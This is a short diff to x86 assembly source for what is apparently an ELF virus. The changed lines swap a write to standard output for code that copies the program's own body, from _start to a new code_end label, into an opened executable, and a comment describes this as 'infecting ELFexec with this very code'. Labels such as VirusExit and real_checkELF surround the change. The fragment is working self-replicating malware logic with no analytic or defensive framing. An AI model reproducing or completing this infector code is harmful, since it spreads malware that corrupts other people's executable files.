@@ -87,7 +87,15 @@ _start:
 		mov ecx, ebp
 		sub ecx, 8
 		
-	write STDOUT, ecx, 4
+
+	;infecting ELFexec with this very code
+	    mov ecx, code_end       ; copy code_end address
+	    sub ecx, _start       ; copy code_end address
+
+	    write dword [ebp-4], _start, ecx
+
+
+	;write STDOUT, ecx, 4
 	close dword [ebp-4]
 	mov eax, 1
 	jmp VirusExit
@@ -148,3 +156,5 @@ real_checkELF:
 	pop ebp
 
 	ret
+
+code_end:
